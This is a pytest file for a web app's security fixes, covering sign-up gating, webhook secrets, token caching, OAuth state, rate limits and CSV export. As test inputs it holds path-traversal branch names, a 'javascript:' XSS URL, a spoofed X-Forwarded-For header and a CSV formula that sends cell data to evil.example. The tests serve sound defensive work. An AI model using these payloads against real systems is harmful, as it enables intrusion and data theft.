"""Release round, security and configuration (docs/PLAN.md section 11): every fix here has a test that fails without it.

Most tests use the demo container (in-memory data) and switch its settings to the mode under test; sign-in in self-hosted
and Google Cloud mode is the real code path with only Firebase's token check stubbed, as in tests/test_auth_flow.py."""
from __future__ import annotations

import hashlib
import hmac
import json
import threading
import time

import pytest
from fastapi.testclient import TestClient

from app.config import Settings, get_settings
from app.main import create_app

PID = "proj-demo"
ORG_NAME = "Mini Policy Engine"
ADMIN, PRIYA, VIJAY, RAVI, MEERA = ({"X-Demo-User": u} for u in ("u-admin", "u-priya", "u-vijay", "u-ravi", "u-meera"))
STRONG = "a-real-webhook-secret-0123456789"


@pytest.fixture
def client(monkeypatch):
    monkeypatch.setenv("CHAT_RATE_PER_MINUTE", "1000")
    monkeypatch.setenv("AGENT_RETRIES", "1")
    monkeypatch.setenv("RETRY_SLEEP_S", "0")
    get_settings.cache_clear()
    with TestClient(create_app()) as c:
        yield c
    get_settings.cache_clear()


def _c(client):
    return client.app.state.container


def _signed_in_as_firebase(client, monkeypatch, mode: str, **settings) -> dict:
    """Switch the container to `mode` with Firebase sign-in: token 't-<user id>' signs in the demo member <user id>, and
    't-new' is a verified login with no account yet. Returns the header for each."""
    c = _c(client)
    for k, v in {"mode": mode, "firebase_project_id": "ww-test", "firebase_api_key": "k", **settings}.items():
        monkeypatch.setattr(c.settings, k, v)
    claims = {f"t-{u}": {"uid": f"fb-{u}", "email": f"{u}@x.dev", "email_verified": True, "name": u}
              for u in ("u-admin", "u-priya", "u-vijay", "new", "other")}
    monkeypatch.setattr("app.firebase_tokens.verify", lambda tok, *_a, **_k: claims[tok])
    for u in ("u-admin", "u-priya", "u-vijay"):
        c.store.firebase[f"fb-{u}"] = u
    return {u: {"Authorization": f"Bearer t-{u}"} for u in ("u-admin", "u-priya", "u-vijay", "new", "other")}


# ================================================================ DEPS-1: model ids
def test_default_models_are_generally_available_ids_with_a_real_fallback_chain():
    from app.agents.core.llm import fallback_models
    from scripts.check_models import configured

    s = Settings()
    # the ids the Gemini API listed on 2026-11-17 (python -m scripts.check_models --list); the old gemini-3.1-flash and
    # gemini-3.1-pro never existed
    assert (s.model_fast, s.model_smart) == ("gemini-3.5-flash-lite", "gemini-3.5-flash")
    assert "gemini-3.1-flash" not in {s.model_fast, s.model_smart, *s.model_fallback.split(",")}
    assert all("preview" not in m and "latest" not in m for m in [s.model_fast, s.model_smart, *s.model_fallback.split(",")])
    for primary in (s.model_fast, s.model_smart):  # the fallback is always another model, never the one that just failed
        chain = fallback_models(s, primary)
        assert chain and primary not in chain
    assert [m for _, m in configured(s)] == ["gemini-3.5-flash-lite", "gemini-3.5-flash", "gemini-3.1-flash-lite", "gemini-2.5-flash"]
    from pathlib import Path

    import yaml

    subs = yaml.safe_load((Path(__file__).resolve().parents[2] / "cloudbuild.yaml").read_text())["substitutions"]
    assert (subs["_MODEL_FAST"], subs["_MODEL_SMART"], subs["_MODEL_FALLBACK"]) == (s.model_fast, s.model_smart, s.model_fallback)


# ================================================================ AUTH-1 / INPUT-03: one organisation, the token's reach
def test_self_hosted_sign_up_creates_the_first_organisation_only(client, monkeypatch):
    c = _c(client)
    h = _signed_in_as_firebase(client, monkeypatch, "self_hosted")
    assert c.store.organization_exists()  # the demo organisation
    r = client.post("/api/signup", json={"name": "Eve", "org_name": "Mine", "project_name": "P", "accept": ["terms", "privacy"]}, headers=h["new"])
    assert r.status_code == 403 and r.json()["detail"]["code"] == "signup_closed"
    assert client.get("/api/config").json()["signup_enabled"] is False  # the web app offers no sign-up

    monkeypatch.setattr(c.store, "organization_exists", lambda: False)  # a fresh server: the first sign-up makes the organisation
    assert client.get("/api/config").json()["signup_enabled"] is True
    first = client.post("/api/signup", json={"name": "Fatima", "org_name": "Acme", "project_name": "Payments", "accept": ["terms", "privacy"]}, headers=h["new"])
    assert first.status_code == 201 and first.json()["role"] == "admin"

    def broken():
        raise RuntimeError("database unavailable")

    monkeypatch.setattr(c.store, "organization_exists", broken)  # unknown is closed, never a second organisation by accident
    assert client.post("/api/signup", json={"name": "O", "org_name": "O", "project_name": "P", "accept": ["terms", "privacy"]}, headers=h["other"]).status_code == 403


def test_sign_up_setting_decides_in_either_mode(client, monkeypatch):
    h = _signed_in_as_firebase(client, monkeypatch, "self_hosted", signup_enabled=True)  # the operator re-opened it
    assert client.post("/api/signup", json={"name": "E", "org_name": "E", "project_name": "P", "accept": ["terms", "privacy"]}, headers=h["new"]).status_code == 201
    monkeypatch.setattr(_c(client).settings, "mode", "gcp")
    monkeypatch.setattr(_c(client).settings, "signup_enabled", False)
    assert client.post("/api/signup", json={"name": "O", "org_name": "O", "project_name": "P", "accept": ["terms", "privacy"]}, headers=h["other"]).status_code == 403
    assert Settings(mode="gcp").signup_open and not Settings(mode="self_hosted").signup_open
    assert Settings(mode="self_hosted", signup_enabled="").signup_enabled is None  # SIGNUP_ENABLED= is the mode's default


class _GitHub:
    """GitHub as the server's GITHUB_TOKEN sees it: repo_info for the repositories it can read."""

    def __init__(self, inner, infos):
        self.inner, self.infos = inner, infos

    def repo_info(self, full_name, installation_id=None):
        return self.infos.get(full_name.lower())

    def __getattr__(self, name):
        return getattr(self.inner, name)


def test_the_servers_github_token_reads_private_repositories_of_allowed_owners_only(client, monkeypatch):
    from app.api import routes

    c = _c(client)
    h = _signed_in_as_firebase(client, monkeypatch, "self_hosted", gemini_api_key="k", github_token="ghp_x")
    monkeypatch.setattr(c.deps, "repos", _GitHub(c.deps.repos, {
        "acme/payments": {"full_name": "acme/payments", "default_branch": "main", "private": True},
        "psf/requests": {"full_name": "psf/requests", "default_branch": "main", "private": False}}))
    published = []
    monkeypatch.setattr(routes, "publish", lambda c, topic, ev: published.append(ev))

    def connect(name: str, **extra):
        pid = client.post("/api/projects", json={"name": f"P {name}"}, headers=h["u-priya"]).json()["id"]
        return client.post(f"/api/projects/{pid}/repositories", json={"full_name": name, **extra}, headers=h["u-priya"])

    hidden = connect("https://github.com/acme/payments")
    assert hidden.status_code == 404 and "GITHUB_ALLOWED_OWNERS" in hidden.json()["detail"]
    # the same answer as for a repository the token cannot see: nobody learns what the server's token reads
    assert connect("acme/nothing-here").json()["detail"] == hidden.json()["detail"].replace("acme/payments", "acme/nothing-here")
    assert connect("psf/requests").status_code == 202  # public: anyone may connect it
    monkeypatch.setattr(c.settings, "github_allowed_owners", "Acme, other-org")
    assert connect("acme/payments").status_code == 202
    assert [e["type"] for e in published] == ["repo.connected", "repo.connected"]


def test_unsafe_self_hosted_combinations_refuse_to_start():
    base = dict(mode="self_hosted", firebase_project_id="p", firebase_api_key="k")
    assert Settings(**base, github_token="t", github_allowed_owners="acme").production_problems() == []  # one organisation
    open_to_all = Settings(**base, signup_enabled=True, github_token="t", github_allowed_owners="acme")
    assert any("SIGNUP_ENABLED=true" in p for p in open_to_all.production_problems())
    assert Settings(**base, signup_enabled=True, github_token="t").production_problems() == []  # the token reads public ones only


# ================================================================ INPUT-12: the branch goes into a GitHub API path
@pytest.mark.parametrize("branch, ok", [("main", True), ("feature/login-2", True), ("release-1.0", True), ("développement", True),
                                        ("../../../../repos/victim/private/tarball/main", False), ("a//b", False), ("/main", False),
                                        ("main/", False), ("x?ref=y", False), ("x#y", False), ("a%2e%2e", False), ("a b", False),
                                        ("x.lock", False), ("a@{1}", False)])
def test_branch_names_are_checked(branch, ok):
    from app.api.routes import valid_branch

    assert valid_branch(branch) is ok


def test_connecting_with_a_traversal_branch_is_refused(client):
    r = client.post(f"/api/projects/{PID}/repositories", json={"full_name": "demo/mini-policy-engine",
                                                                "default_branch": "../../../../repos/victim/private/tarball/main"},
                    headers=PRIYA)
    assert r.status_code == 422


def _tarball(files: dict[str, bytes]) -> bytes:
    import io
    import tarfile

    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for path, data in files.items():
            info = tarfile.TarInfo(f"o-r-abc/{path}")
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def _read(files: dict[str, bytes], limits):
    import httpx

    from app.adapters.github import read_tarball

    http = httpx.Client(transport=httpx.MockTransport(lambda req: httpx.Response(200, content=_tarball(files))))
    return read_tarball(http, "https://api.github.com/repos/o/r/tarball/main", {}, "o/r", limits=limits)


def test_reading_a_repository_stops_at_the_limits_and_skips_a_huge_codeowners():
    """INPUT-12 / REL-05: what is held in memory while reading is bounded; CODEOWNERS gets the per-file size cap too."""
    from app.ports import SourceTooLarge

    small = {f"src/m{i}.py": b"x = 1\n" for i in range(5)}
    assert len(_read(small, (3, 150))) == 5  # within twice the limit: the exact check is ingestion's
    with pytest.raises(SourceTooLarge, match="INDEX_MAX_FILES"):
        _read({**small, **{f"src/n{i}.py": b"y = 2\n" for i in range(5)}}, (3, 150))
    big = {f"src/b{i}.py": b"#" * 300_000 for i in range(5)}  # 1.5 MB of text against a 1 MB limit (2 MB read at most)
    assert len(_read(dict(list(big.items())[:3]), (100, 1))) == 3
    with pytest.raises(SourceTooLarge, match="INDEX_MAX_MB"):
        _read({**big, **{f"src/c{i}.py": b"#" * 300_000 for i in range(3)}}, (100, 1))
    files = _read({".github/CODEOWNERS": b"* @a\n" * 200_000, "README.md": b"hi"}, (100, 150))
    assert ".github/CODEOWNERS" not in files and "README.md" in files


def test_a_repository_stopped_while_reading_is_reported_as_too_large(client):
    from app.agents.specialists.librarian import agent as ingestion
    from app.ports import SourceTooLarge, TooLarge

    c = _c(client)
    repo = c.store.repos_for(PID)[0]

    def over(*_a, **_k):
        raise SourceTooLarge("demo/mini-policy-engine has more than 40,000 files to index; the limit is 20,000 (INDEX_MAX_FILES).")

    c.deps.repos.files = over
    c.deps.repos.head_sha = lambda *_a, **_k: "new-sha"
    with pytest.raises(TooLarge, match="Nothing was changed"):
        ingestion.ingest_repo(c.deps, repo, repo.default_branch)


# ================================================================ AUTH-2 / INPUT-01 / OPS-03 / E2E-9: GitHub webhooks
def _hook(client, secret: str, payload: dict, event: str = "push"):
    body = json.dumps(payload).encode()
    sig = "sha256=" + hmac.new(secret.encode(), body, hashlib.sha256).hexdigest()
    return client.post("/webhooks/github", content=body, headers={"X-GitHub-Event": event, "X-Hub-Signature-256": sig})


PUSH = {"ref": "refs/heads/main", "after": "abc123", "repository": {"full_name": "demo/mini-policy-engine", "default_branch": "main"},
        "commits": [{"modified": ["engine/validate.py"]}]}


def test_the_public_default_secret_is_refused_outside_the_demo(client, monkeypatch):
    c = _c(client)
    monkeypatch.setattr(c.settings, "mode", "self_hosted")
    assert _hook(client, "dev-secret", PUSH).status_code == 404
    monkeypatch.setattr(c.settings, "github_webhook_secret", STRONG)
    assert _hook(client, STRONG, PUSH).status_code == 404  # no GitHub App: repositories connected by URL are polled instead
    monkeypatch.setattr(c.settings, "mode", "gcp")
    monkeypatch.setattr(c.settings, "github_webhook_secret", "dev-secret")
    assert _hook(client, "dev-secret", PUSH).status_code == 404
    assert Settings(github_webhook_secret="unused").github_webhook_secret == ""  # DEPLOY.md's placeholder is never a key


def test_a_repository_connected_by_url_takes_no_webhook_and_pr_links_are_built_not_trusted(client, monkeypatch):
    from app.api import webhooks

    c = _c(client)
    monkeypatch.setattr(c.settings, "mode", "gcp")
    monkeypatch.setattr(c.settings, "github_webhook_secret", STRONG)
    sent = []
    monkeypatch.setattr(webhooks, "publish", lambda c, topic, ev: sent.append(ev))
    repo = next(r for r in c.store.repos.values() if r.full_name == "demo/mini-policy-engine")
    assert repo.installation_id is None
    assert _hook(client, STRONG, PUSH).json() == {"events": 0}  # '' == '' no longer matches

    monkeypatch.setattr(repo, "installation_id", "42")
    pr = {"action": "opened", "installation": {"id": 42}, "repository": {"full_name": "demo/mini-policy-engine"},
          "pull_request": {"number": 7, "html_url": "javascript:alert(document.domain)", "head": {"sha": "s", "ref": "b"},
                           "user": {"login": "vijay"}}}
    assert _hook(client, STRONG, pr, "pull_request").json() == {"events": 1}
    assert sent[-1]["pr_url"] == "https://github.com/demo/mini-policy-engine/pull/7"
    assert _hook(client, STRONG, {**pr, "installation": {"id": 43}}, "pull_request").json() == {"events": 0}


def test_production_asks_for_a_real_webhook_secret_with_a_github_app():
    for mode, extra in (("self_hosted", {"firebase_project_id": "p", "firebase_api_key": "k"}),
                        ("gcp", {"gcp_project": "p", "gcs_bucket": "b", "outbox_flush_audience": "a", "outbox_flush_invoker": "i"})):
        for weak in ("dev-secret", "", "unused", "short-secret"):
            s = Settings(mode=mode, github_app_id="1", github_webhook_secret=weak, **extra)
            assert any("GITHUB_WEBHOOK_SECRET" in p for p in s.production_problems()), (mode, weak)
        assert not any("GITHUB_WEBHOOK_SECRET" in p for p in Settings(mode=mode, github_app_id="1", github_webhook_secret=STRONG,
                                                                         **extra).production_problems())
        assert not any("WEBHOOK" in p for p in Settings(mode=mode, **extra).production_problems())  # no app: the route is off


def test_the_install_link_is_never_signed_with_the_public_secret(client, monkeypatch):
    c = _c(client)
    h = _signed_in_as_firebase(client, monkeypatch, "gcp", github_app_slug="ww")
    r = client.get(f"/api/github/install-url?project_id={PID}", headers=h["u-priya"])
    assert r.status_code == 503
    monkeypatch.setattr(c.settings, "github_webhook_secret", STRONG)
    assert client.get(f"/api/github/install-url?project_id={PID}", headers=h["u-priya"]).json()["url"].startswith("https://github.com/apps/ww/")


# ================================================================ REL-07 / AUTH-3: Google's signing certificates
class _Clock:
    def __init__(self):
        self.t = 1_000_000.0

    def __call__(self):
        return self.t


def test_made_up_key_ids_download_at_most_once_a_minute():
    from app.firebase_tokens import InvalidToken, _Certs, verify
    from tests.test_firebase_tokens import CERT, PROJECT, token

    calls, clock = [], _Clock()

    def fetch():
        calls.append(1)
        return {"k1": CERT}, 21600.0

    certs = _Certs(fetch, clock=clock)
    verify(token(), PROJECT, certs)
    for i in range(50):
        with pytest.raises(InvalidToken):
            verify(token(kid=f"forged-{i}"), PROJECT, certs)
    assert len(calls) == 2  # the first sign-in, then one refetch for all 50 unknown key ids
    clock.t += 61
    with pytest.raises(InvalidToken):
        verify(token(kid="forged-again"), PROJECT, certs)
    assert len(calls) == 3


def test_an_outage_at_expiry_keeps_the_last_good_certificates():
    from app.firebase_tokens import InvalidToken, _Certs, verify
    from tests.test_firebase_tokens import CERT, PROJECT, token

    calls, clock, down = [], _Clock(), [False]

    def fetch():
        calls.append(1)
        if down[0]:
            raise OSError("network unreachable")
        return {"k1": CERT}, 3600.0

    certs = _Certs(fetch, clock=clock)
    verify(token(), PROJECT, certs)
    down[0], clock.t = True, clock.t + 3601  # expired, and Google cannot be reached
    assert verify(token(), PROJECT, certs)["uid"] == "uid-1"
    assert verify(token(), PROJECT, certs)["uid"] == "uid-1"
    assert len(calls) == 2  # one failed attempt, then a pause before the next
    with pytest.raises(InvalidToken):  # nothing cached at all and Google unreachable: refused, not a crash
        verify(token(), PROJECT, _Certs(fetch, clock=clock))


def test_a_slow_download_does_not_hold_up_other_sign_ins():
    from app.firebase_tokens import _Certs, verify
    from tests.test_firebase_tokens import CERT, PROJECT, token

    clock, started, release = _Clock(), threading.Event(), threading.Event()
    first = [True]

    def fetch():
        if first[0]:
            first[0] = False
            return {"k1": CERT}, 60.0
        started.set()
        release.wait(5)  # Google answering slowly
        return {"k1": CERT}, 60.0

    certs = _Certs(fetch, clock=clock)
    verify(token(), PROJECT, certs)
    clock.t += 61  # stale: the next request downloads
    slow = threading.Thread(target=lambda: verify(token(), PROJECT, certs))
    slow.start()
    assert started.wait(5)
    t0 = time.monotonic()
    assert verify(token(), PROJECT, certs)["uid"] == "uid-1"  # served from the cache while the download runs
    assert time.monotonic() - t0 < 1
    release.set()
    slow.join(5)


# ================================================================ AUTH-4 / INPUT-08: Google OAuth state bound to the browser
def test_the_google_callback_completes_only_in_the_browser_that_started_it(client, monkeypatch):
    import httpx

    from app.api.integrations import CALLBACK_PATH, STATE_COOKIE
    from app.services import scheduling as S

    c = _c(client)
    h = _signed_in_as_firebase(client, monkeypatch, "self_hosted", google_oauth_client_id="cid", google_oauth_client_secret="sec",
                               token_encryption_key="k" * 40, public_url="https://ww.example")
    exchanged = []
    c.extras["google_transport"] = httpx.MockTransport(lambda req: exchanged.append(req) or httpx.Response(500))
    r = client.get("/api/integrations/google/start", headers=h["u-priya"])
    assert r.status_code == 200
    cookie = r.headers["set-cookie"]
    assert f"{STATE_COOKIE}=" in cookie and "HttpOnly" in cookie and "samesite=lax" in cookie.lower() and f"Path={CALLBACK_PATH}" in cookie
    assert "Secure" in cookie

    client.cookies.clear()
    victim_state = S.make_state(c.settings, "org-demo", "u-priya")  # a consent link sent to someone else's browser
    r = client.get(f"/api/integrations/google/callback?code=4/abc&state={victim_state}", follow_redirects=False)
    assert r.headers["location"].endswith("google=expired") and not exchanged  # the code is never exchanged


# ================================================================ INPUT-05 / OPS-04 / INPUT-13: rate-limit groups
@pytest.mark.parametrize("method, path, group", [
    ("POST", "/api/onboardings/ob-1/summaries", "agents"), ("GET", "/api/onboardings/ob-1/first-task/shortlist", "agents"),
    ("GET", "/api/onboardings/ob-1/completion", "agents"), ("POST", "/api/handovers", "agents"), ("POST", "/api/agents/tick", "agents"),
    ("GET", "/api/onboardings/ob-1/summaries", "default"), ("GET", "/api/handovers", "default"), ("POST", "/api/chat", "chat")])
def test_routes_that_run_an_agent_have_their_own_limit(method, path, group):
    from app.ratelimit import RateLimitSettings, group_for

    g = group_for(method, path)
    assert g.name == group
    if group == "agents":
        assert g.by_person and RateLimitSettings().agents_per_minute == 20


def test_the_client_written_part_of_x_forwarded_for_is_never_the_address():
    """INPUT-05 / OPS-04 / AUTH-9: the limits take the address the proxies appended, from the right; the web container
    forwards only the last entry; uvicorn no longer trusts X-Forwarded-For from anyone; the pipeline sets the hop count."""
    from pathlib import Path

    from app.ratelimit import client_address

    scope = {"client": ("169.254.1.1", 0), "headers": [(b"x-forwarded-for", b"6.6.6.6, 203.0.113.9, 34.1.2.3")]}
    assert client_address(scope, 2) == "203.0.113.9"
    assert client_address({**scope, "headers": [(b"x-forwarded-for", b"34.1.2.3")]}, 2) == "169.254.1.1"  # too few: the peer
    root = Path(__file__).resolve().parents[2]
    assert "forwarded-allow-ips='*'" not in (root / "backend/Dockerfile").read_text()
    nginx = (root / "frontend/nginx.conf.template").read_text()
    assert nginx.count("proxy_pass $api") == nginx.count("proxy_set_header X-Forwarded-For $ww_client_addr;") > 0
    assert "RATE_LIMIT_TRUSTED_HOPS=${_RATE_LIMIT_TRUSTED_HOPS}" in (root / "cloudbuild.yaml").read_text()
    assert "xfwd: true" in (root / "frontend/vite.config.ts").read_text()


def test_a_preboarding_acknowledgement_records_the_address_the_limits_use(monkeypatch):
    from app import ratelimit

    monkeypatch.setattr(ratelimit, "_trusted_hops", lambda: 1)
    scope = {"client": ("10.0.0.2", 0), "headers": [(b"x-forwarded-for", b"6.6.6.6, 198.51.100.7")]}
    assert ratelimit.request_address(scope) == "198.51.100.7"


# ================================================================ INPUT-06: request body size
def test_an_oversized_body_is_refused_before_it_is_read(client):
    big = json.dumps({"project_id": PID, "question": "x" * (2 * 1024 * 1024)})
    r = client.post("/api/chat", content=big, headers={"Content-Type": "application/json"})  # no sign-in: refused on size first
    assert r.status_code == 413

    def chunks():
        for _ in range(40):
            yield b"x" * 65536  # 2.5 MiB with no Content-Length

    r = client.post("/webhooks/calendly", content=chunks())
    assert r.status_code in {404, 413}  # Calendly is off here; the size limit for webhooks is GitHub's 25 MB
    r = client.post("/api/chat", content=chunks(), headers={"Content-Type": "application/json"})
    assert r.status_code == 413


def test_each_route_has_its_body_limit():
    from app.ratelimit import MiB, body_limit

    s = Settings(max_upload_mb=25, max_recording_mb=2048, max_json_kb=1024)
    assert body_limit("POST", "/api/chat", s) == MiB
    assert body_limit("POST", "/api/projects/p1/documents", s) == 26 * MiB
    assert body_limit("POST", "/api/meetings/m1/recording", s) == 2049 * MiB
    assert body_limit("POST", "/webhooks/github", s) == 26 * MiB


def test_a_document_within_its_limit_passes(client):
    r = client.post(f"/api/projects/{PID}/documents", files={"file": ("big.md", b"# Notes\n" + b"a" * (3 * 1024 * 1024), "text/markdown")},
                    headers=PRIYA)
    assert r.status_code == 202


# ================================================================ REL-16: threads and the Guide
def test_the_thread_pool_is_raised_and_the_guide_has_slots(client, monkeypatch):
    import anyio.to_thread

    from app.api import routes

    async def tokens():
        return anyio.to_thread.current_default_thread_limiter().total_tokens

    assert client.portal.call(tokens) == _c(client).settings.api_threads == 100
    monkeypatch.setattr(_c(client).settings, "chat_concurrency", 1)
    assert routes._guide_slots.enter(1)  # one question is being answered
    try:
        r = client.post("/api/chat", json={"project_id": PID, "question": "Where is check_labels?"}, headers=VIJAY)
        assert r.status_code == 429 and r.headers["retry-after"] == "5"
        r = client.post("/api/ask/route", json={"project_id": PID, "question": "Where is check_labels?"}, headers=VIJAY)
        assert r.status_code == 429
    finally:
        routes._guide_slots.leave()
    assert client.post("/api/chat", json={"project_id": PID, "question": "Where is check_labels?"}, headers=VIJAY).status_code == 200


# ================================================================ E2E-5: an answer is never lost to an indexing failure
def test_an_expert_answer_and_a_verified_answer_survive_an_indexing_failure(client, monkeypatch):
    c = _c(client)
    q = "How is the mutate module benchmarked?"
    asked = client.post("/api/chat", json={"project_id": PID, "question": q}, headers=VIJAY).json()
    [req] = [r for r in client.get("/api/experts/requests", headers=RAVI).json() if r["message_id"] == asked["message_id"]]
    real = c.index.upsert

    def down(chunks):
        raise RuntimeError("embedding quota used up")

    monkeypatch.setattr(c.index, "upsert", down)
    r = client.post(f"/api/experts/requests/{req['id']}/answer", json={"answer": "With pytest-benchmark."}, headers=RAVI)
    assert r.status_code == 200 and r.json() == {"ok": True, "indexed": False}
    assert any("answered" in n["text"] for n in client.get("/api/notifications", headers=VIJAY).json())  # the hire still hears
    body = {"project_id": PID, "question": q, "answer": "With pytest-benchmark in CI.", "source_request_id": req["id"]}
    first = client.post("/api/verified-answers", json=body, headers=RAVI)
    assert first.status_code == 201 and first.json()["indexed"] is False

    monkeypatch.setattr(c.index, "upsert", real)
    again = client.post("/api/verified-answers", json=body, headers=RAVI)  # the retry indexes it
    assert again.json()["id"] == first.json()["id"] and again.json()["indexed"] is True
    assert f"verified-{req['id']}" in c.index.chunks

    plain = {"project_id": PID, "question": "Who owns the  release notes?", "answer": "Meera."}
    one = client.post("/api/verified-answers", json=plain, headers=RAVI).json()
    two = client.post("/api/verified-answers", json={**plain, "question": "who owns the release notes?"}, headers=RAVI).json()
    assert one["id"] == two["id"]  # a double click is one verified answer, not two sources


# ================================================================ E2E-13: an outage is not a missing project
def test_a_database_error_is_not_reported_as_a_missing_project(client, monkeypatch):
    c = _c(client)
    assert client.get("/api/projects/no-such-project", headers=PRIYA).status_code == 404

    def outage(project_id):
        raise ConnectionError("could not connect to server")

    monkeypatch.setattr(c.store, "get_project", outage)
    r = client.get(f"/api/projects/{PID}", headers=PRIYA)
    assert r.status_code == 500 and r.json()["request_id"]


# ================================================================ AUTH-10: the shared demo cannot be locked
def test_deleting_the_demo_organisation_does_not_lock_the_demo(client):
    assert client.request("DELETE", "/api/org", json={"confirm": ORG_NAME}, headers=ADMIN).status_code == 200
    r = client.post("/api/demo/login", json={"email": "admin@demo.dev", "password": "welcome-wave"})
    assert r.status_code == 200 and r.json()["user"]["id"] == "u-admin"  # seeded again
    assert client.get("/api/demo/people").json()["members"]


# ================================================================ AUTH-6 / AUTH-7: leaving
def test_a_deactivated_member_can_still_leave(client):
    c = _c(client)
    c.store.set_member_status(c.store.get_user("u-meera").org_id, "u-meera", "deactivated")
    assert client.get("/api/me", headers=MEERA).status_code == 403
    assert client.post("/api/me/leave", headers=MEERA).status_code == 204
    assert "u-meera" not in c.store.firebase.values()


def test_the_last_person_cannot_leave_an_organisation_that_holds_data(client):
    c = _c(client)
    empty = c.store.create_organization("fb-solo", "solo@x.dev", "Solo", "Made by mistake", "P")
    assert client.post("/api/me/leave", headers={"X-Demo-User": empty.id}).status_code == 204

    full = c.store.create_organization("fb-trial", "trial@x.dev", "Trial", "Trial org", "P")
    [project] = c.store.projects_for(full)
    c.store.create_document(project.id, "Salaries", "gs://local/docs/x/salaries.pdf", "application/pdf", full.id)
    r = client.post("/api/me/leave", headers={"X-Demo-User": full.id})
    assert r.status_code == 409 and r.json()["detail"] == "delete_org_instead"


# ================================================================ AUTH-8: installations are per organisation in memory too
def test_memory_installations_are_scoped_to_the_calling_organisation():
    from app.adapters.memory import MemoryStore
    from app.adapters.postgres import current_org

    store = MemoryStore()
    store.bind_installation("1", "org-a", "acme", "u1")
    store.bind_installation("2", "org-b", "rival", "u2")
    token = current_org.set("org-a")
    try:
        assert [i["installation_id"] for i in store.org_installations()] == ["1"]
    finally:
        current_org.reset(token)
    assert store.org_installations() == []  # no tenant: nothing, as row-level security gives


# ================================================================ INPUT-10: the report CSV
def test_report_csv_cells_cannot_become_formulas():
    import csv
    import io

    from app.lifecycle.reporting import to_csv

    fig = {"key": "k", "label": "Days to first change", "unit": "days", "how": "median",
           "current": {"value": -2, "display": "-2", "n": 5}, "previous": {"value": None, "display": "=not enough", "n": 1}}
    report = {"figures": [fig], "teams": [{"team_id": "t1", "team": '=HYPERLINK("https://evil.example/?"&A2,"Open")', "figures": [fig]}],
              "surveys": {"teams": []}}
    rows = list(csv.reader(io.StringIO(to_csv(report))))
    assert rows[1][3] == "-2"  # a number stays a number
    assert rows[1][5] == "'=not enough"
    assert rows[2][1].startswith("'=HYPERLINK")


# ================================================================ PRIV-3: a deleted document's file goes too
def test_deleting_a_document_deletes_its_stored_file(client, monkeypatch):
    import os

    from app.api import routes

    c = _c(client)
    up = client.post(f"/api/projects/{PID}/documents", files={"file": ("hr.md", b"# Salaries\nconfidential", "text/markdown")},
                     headers=PRIYA)
    doc_id = up.json()["document_id"]
    uri = c.store.get_document(doc_id)["uri"]
    assert c.deps.blobs.get(uri)
    assert client.delete(f"/api/projects/{PID}/documents/{doc_id}", headers=PRIYA).status_code == 204
    with pytest.raises(FileNotFoundError):
        c.deps.blobs.get(uri)

    def files():
        root = os.path.join(c.deps.blobs.root, "local", "docs", PID)
        return sorted(os.path.join(d, f) for d, _, fs in os.walk(root) for f in fs)

    before = files()

    def fail(*a, **k):
        raise TimeoutError("queue")

    monkeypatch.setattr(routes, "publish", fail)
    r = client.post(f"/api/projects/{PID}/documents", files={"file": ("x.md", b"# X", "text/markdown")}, headers=PRIYA)
    assert r.status_code == 500 and files() == before  # no row, and no file left behind


# ================================================================ OPS-14: startup checks
def test_startup_refuses_insecure_production_settings():
    assert any("ENV must be dev or prod" in p for p in Settings(env="production").production_problems())
    gcp = dict(mode="gcp", env="prod", gcp_project="p", gcs_bucket="b", outbox_flush_audience="a", outbox_flush_invoker="i",
               firebase_api_key="k", database_url="postgresql+psycopg://app:pw@db.internal/ww")
    assert any("PUBLIC_URL is required" in p for p in Settings(**gcp).production_problems())
    assert any("https://" in p for p in Settings(**gcp, public_url="http://app.example.com").production_problems())
    assert Settings(**gcp, public_url="https://app.example.com").production_problems() == []
    assert any("CORS_ORIGINS" in p for p in Settings(**gcp, public_url="https://a.example", cors_origins="*").production_problems())
    sh = dict(mode="self_hosted", env="prod", firebase_project_id="p", firebase_api_key="k", database_url="postgresql+psycopg://ww_app:pw@db:5432/welcomewave")
    assert Settings(**sh, public_url="http://localhost:5173").production_problems() == []  # this machine only
    assert any("https://" in p for p in Settings(**sh, public_url="http://192.168.1.20:5173").production_problems())
    assert not any("PUBLIC_URL" in p for p in Settings(**gcp).production_problems(serves_http=False))  # workers serve no links
